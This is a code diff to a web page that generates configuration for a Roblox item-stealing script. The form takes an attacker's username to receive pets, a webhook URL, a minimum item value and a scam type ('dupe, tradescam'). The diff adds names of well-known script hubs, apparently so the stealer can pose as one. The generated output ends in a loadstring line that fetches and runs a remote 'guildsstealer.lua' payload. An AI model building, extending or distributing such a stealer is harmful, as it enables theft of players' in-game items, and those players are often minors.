@@ -106,9 +106,16 @@
       
       <label for="scriptname">Script Name:</label>
       <select id="scriptname" name="scriptname">
-        <option value="nexus hub">Nexus Hub</option>
-        <option value="eclipse hub">Eclipse Hub</option>
-        <option value="clever hub">Clever Hub</option>
+        <option value="Overdrive H">Overdrive H</option>
+        <option value="Symphony Hub">Symphony Hub</option>
+        <option value="Highlight Hub">Highlight Hub</option>
+        <option value="Nexus Hub">Nexus Hub</option>
+        <option value="Cleve Hub">Cleve Hub</option>
+        <option value="Eclipse Hub">Eclipse Hub</option>
+        <option value="R3TH PRIV">R3TH PRIV</option>
+        <option value="AshbornnHub">AshbornnHub</option>
+        <option value="Nexus">Nexus</option>
+        <option value="YARHM">YARHM</option>
       </select><br><br>
       
       <label for="stealer">Stealer:</label>
@@ -155,16 +162,16 @@
         }
 
         // Generate output string based on the new structure
-const outputString = `config = {\n` +
-                     `    Username = "${username}", -- Username To Send Pets To\n` +
-                     `    Webhook = "${webhook}", -- Webhook URL\n` +
-                     `    MinimumRap = "${minimumRap}", -- Minimum RAP of each item you want to get sent to you\n` +
-                     `    typesui = "${typesui}", -- kavo, orion, fluent\n` +
-                     `    typescript = "${typescript}", -- dupe, tradescam\n` +
-                     `    scriptname = "${scriptname}", -- nexus hub, eclipse hub, clever hub\n` +
-                     `    stealer = "${stealer}", -- ps99, SOON MM2 AND ADOPT ME\n` +
-                     `}\n\n` +
-                     'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/gui-stealer/main/guildsstealer.lua",true))()';
+        const outputString = `config = {\n` +
+                             `    Username = "${username}", -- Username To Send Pets To\n` +
+                             `    Webhook = "${webhook}", -- Webhook URL\n` +
+                             `    MinimumRap = "${minimumRap}", -- Minimum RAP of each item you want to get sent to you\n` +
+                             `    typesui = "${typesui}", -- kavo, orion, fluent\n` +
+                             `    typescript = "${typescript}", -- dupe, tradescam\n` +
+                             `    scriptname = "${scriptname}", -- Overdrive H, Symphony Hub, Highlight Hub, Nexus Hub, Cleve Hub, Eclipse Hub, R3TH PRIV, AshbornnHub, Nexus, YARHM\n` +
+                             `    stealer = "${stealer}", -- ps99, SOON MM2 AND ADOPT ME\n` +
+                             `}\n\n` +
+                             'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/gui-stealer/main/guildsstealer.lua",true))()';
 
         // Set the output in the textarea
         document.getElementById("output").value = outputString;
